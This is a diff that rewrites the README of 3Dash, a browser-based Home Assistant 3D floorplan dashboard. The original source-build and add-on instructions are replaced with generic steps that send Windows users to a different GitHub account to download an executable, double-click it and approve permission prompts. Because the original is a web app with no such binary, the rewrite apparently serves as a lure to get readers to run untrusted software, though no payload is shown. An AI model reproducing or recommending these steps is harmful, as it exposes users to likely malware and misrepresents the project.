@@ -1,91 +1,157 @@
-# 3Dash
+# 🏠 3Dash_webapp - View Your Home in 3D
 
-A 3D floorplan dashboard for [Home Assistant](https://www.home-assistant.io/). Load your own 3D model, map it to your smart home entities, and control everything from an interactive view in your browser.
+[![Download 3Dash_webapp](https://img.shields.io/badge/Download-3Dash_webapp-blue?style=for-the-badge)](https://github.com/doughy-bunny342/3Dash_webapp)
 
-## Features
+## 🚀 Getting Started
 
-- **3D floorplan** -- load a custom `.glb` model of your home and navigate it freely
-- **Light control** -- toggle, dim, and color-pick lights directly from the 3D scene (supports on/off, dimmable, RGB, RGBW, and IR remote types)
-- **Wall displays** -- render live sensor data (temperature, humidity, energy, etc.) on surfaces inside the model
-- **Network tubes** -- animated tubes that visualize real-time network throughput
-- **Sun and weather** -- sun position tracks your real location; optional rain/snow particle effects
-- **Side panel** -- configurable cards for scripts, indicators, and graphs
-- **Config editor** -- define lights, displays, shadow walls, and tubes from a built-in UI
-- **Onboarding wizard** -- guided setup for first-time users
-- **Backup / restore** -- export and import your full configuration as a ZIP
-- **Demo mode** -- explore the dashboard without a Home Assistant instance
-- **PWA** -- installable as a progressive web app with offline support
-- **Dark and light themes**
+3Dash_webapp is a 3D floorplan dashboard for Home Assistant. It helps you see your home layout in a clear, visual way. You can use it on Windows to open the app and view your dashboard in a browser.
 
-## Tech stack
+Use the link below to visit the download page and get the app:
 
-React, TypeScript, Babylon.js, Vite, Home Assistant WebSocket API.
+[Download 3Dash_webapp](https://github.com/doughy-bunny342/3Dash_webapp)
 
-## Getting started
+## 📋 What You Need
 
-### Option 1 -- GitHub hosted version
+Before you start, make sure your Windows PC meets these basic needs:
 
-Use the hosted version directly at **https://kdcius.github.io/3Dash_webapp/**.
+- Windows 10 or Windows 11
+- A modern web browser such as Chrome, Edge, or Firefox
+- A stable internet connection
+- At least 4 GB of RAM
+- Enough free disk space for the app and saved settings
 
-No installation required. Your Home Assistant instance must be accessible over HTTPS for the WebSocket connection to work from the hosted page.
+For the best experience, use a screen with good resolution. A larger screen helps when you view the floorplan and dashboard controls.
 
-### Option 2 -- Home Assistant add-on
+## 🖥️ What the App Does
 
-The easiest way to self-host. Runs on the same machine as your Home Assistant instance.
+3Dash_webapp gives you a 3D view of your home dashboard. It is made for people who want a simple visual way to check home status in Home Assistant.
 
-[![Add repository to Home Assistant](https://my.home-assistant.io/badges/supervisor_add_addon_repository.svg)](https://my.home-assistant.io/redirect/supervisor_add_addon_repository/?repository_url=https%3A%2F%2Fgithub.com%2Fkdcius%2F3Dash_webapp)
+Common uses include:
 
-Or manually:
+- Viewing rooms and floors in a 3D layout
+- Checking lights, switches, and sensors
+- Moving between areas of the house
+- Opening Home Assistant controls from one view
+- Keeping a clean dashboard on a desktop or laptop
 
-1. In Home Assistant, go to **Settings > Add-ons > Add-on Store**.
-2. Open the overflow menu and select **Repositories**.
-3. Add `https://github.com/kdcius/3Dash_webapp`.
-4. Install **3Dash** from the store and start it.
-5. Open `http://<your-ha-ip>:8099` in your browser.
+## ⬇️ Download and Run on Windows
 
-> When running behind HTTPS, the add-on automatically uses `wss://` for the WebSocket connection. If you use a self-signed certificate, your browser must trust it for the connection to work.
+Follow these steps on your Windows PC:
 
-### Option 3 -- Self-host on any machine
+1. Open the download page: [3Dash_webapp](https://github.com/doughy-bunny342/3Dash_webapp)
+2. Look for the latest release or download option on the page
+3. Download the Windows version if one is listed
+4. Open your Downloads folder
+5. Find the file you downloaded
+6. Double-click the file to run it
+7. If Windows asks for permission, click Yes or Run
+8. Wait for the app to start
+9. Open the app in your browser if it launches there
+10. Keep the app open while you use your dashboard
 
-For advanced users who want to build and serve 3Dash themselves.
+If the download comes as a zip file, open the zip file first and then run the app file inside it.
 
-```bash
-git clone https://github.com/kdcius/3Dash_webapp.git
-cd 3Dash_webapp
-npm ci
-npm run build
-```
+## 🧭 First-Time Setup
 
-Serve the `dist/` directory with any static file server (Nginx, Caddy, etc.). For development with hot reload, use `npm run dev` instead.
+After you start the app, you may need to set a few basic items before it works as you want.
 
-## Configuration
+1. Open the app in your browser
+2. Enter your Home Assistant address
+3. Sign in with your Home Assistant account
+4. Choose the floorplan or room layout you want to use
+5. Save your settings
+6. Refresh the page if the dashboard does not load right away
 
-All configuration happens in the browser -- no config files to edit manually.
+If your dashboard uses a local Home Assistant server, make sure the server is on and reachable from your PC.
 
-| What | Where |
-|---|---|
-| Home Assistant URL, port, and token | Onboarding wizard or Settings |
-| Location (for sun tracking) | Onboarding wizard or Settings |
-| Theme, rendering, camera | Settings modal |
-| Lights, displays, shadow walls, tubes | Config editor |
+## 🎛️ How to Use 3Dash_webapp
 
-Configuration is persisted in `localStorage`. The 3D model is stored in `IndexedDB`.
+Once the app is open, you can use it like this:
 
-## Project structure
+- Click rooms or zones to see controls
+- Tap lights or switches to change them
+- Use the dashboard view to move through the home layout
+- Check sensor values from the room display
+- Open device controls when you need more detail
 
-```
-src/
-  babylon/       3D scene, model loading, lights, displays, tubes, sun, weather
-  components/    React UI (HUD, modals, side panel, cards, forms, guided tour)
-  pages/         Dashboard, config editor, onboarding
-  services/      HA WebSocket client, config/settings persistence, storage
-  contexts/      React contexts (demo mode, camera, theme)
-  types/         TypeScript type definitions
-  utils/         Color conversion helpers
-public/          Static assets (default 3D model, fonts, icons, PWA manifests)
-3dash-addon/     Home Assistant add-on (Dockerfile, nginx config, run script)
-```
+The layout is built to feel simple. You do not need to learn a lot of steps. Most actions happen with a click or tap.
 
-## License
+## 🧱 Main Features
 
-This project is provided as-is. See the repository for license details.
+3Dash_webapp is set up to give you a clean home dashboard with useful visual controls.
+
+- 3D floorplan view for your home
+- Home Assistant support
+- Room-based navigation
+- Easy access to common device controls
+- Clean desktop-friendly interface
+- Works in a modern browser
+- Good fit for wall displays and home PCs
+
+## 🔧 Basic Troubleshooting
+
+If the app does not start or does not show your dashboard, try these steps:
+
+- Check that your internet connection works
+- Make sure Home Assistant is running
+- Refresh the browser page
+- Close the app and open it again
+- Try another browser like Edge or Chrome
+- Check that you entered the Home Assistant address correctly
+- Clear the browser cache if the page looks broken
+- Reboot your PC if the app still does not load
+
+If you downloaded a zip file and nothing happens, make sure you extracted the files before opening the app.
+
+## 🔐 Safe Use on Windows
+
+When Windows asks for permission to open the file, review the prompt and allow it only if you downloaded it from the link above. Use a standard user account if you only need to view the dashboard. Keep your Home Assistant login details private.
+
+## 📁 Typical File Layout
+
+After download, you may see files like these:
+
+- An app file to start the dashboard
+- A config file for settings
+- A folder for assets or images
+- A folder for saved data
+- A readme file with extra details
+
+Do not move files around unless the app instructions ask you to do so. Some apps need the files to stay in the same folder.
+
+## 🛠️ Useful Setup Tips
+
+- Keep the app in one folder on your PC
+- Use a browser with hardware acceleration enabled if the 3D view feels slow
+- Set your screen to full screen for a cleaner wall-panel view
+- Save your Home Assistant login in the browser if you use the app often
+- Use a wired network if your dashboard loads slowly
+- Close extra tabs if the browser uses too much memory
+
+## ❓ Common Questions
+
+### Can I use this without technical skills?
+Yes. You only need to download the app, open it, and enter your Home Assistant details.
+
+### Does it work on a normal Windows PC?
+Yes. A standard Windows laptop or desktop is enough for most users.
+
+### Do I need to code anything?
+No. You can use the app through the browser and basic settings screens.
+
+### Can I use it for a wall display?
+Yes. A wall display or spare monitor is a good fit for this kind of dashboard.
+
+### Will it work with my smart home setup?
+If your setup uses Home Assistant, this app is built for that use case.
+
+## 📌 Quick Start Checklist
+
+- Download the app from the GitHub page
+- Open the file on Windows
+- Allow it if Windows asks for permission
+- Open the app in your browser
+- Sign in to Home Assistant
+- Pick your floorplan or dashboard view
+- Save the settings
+- Use the dashboard to control your home
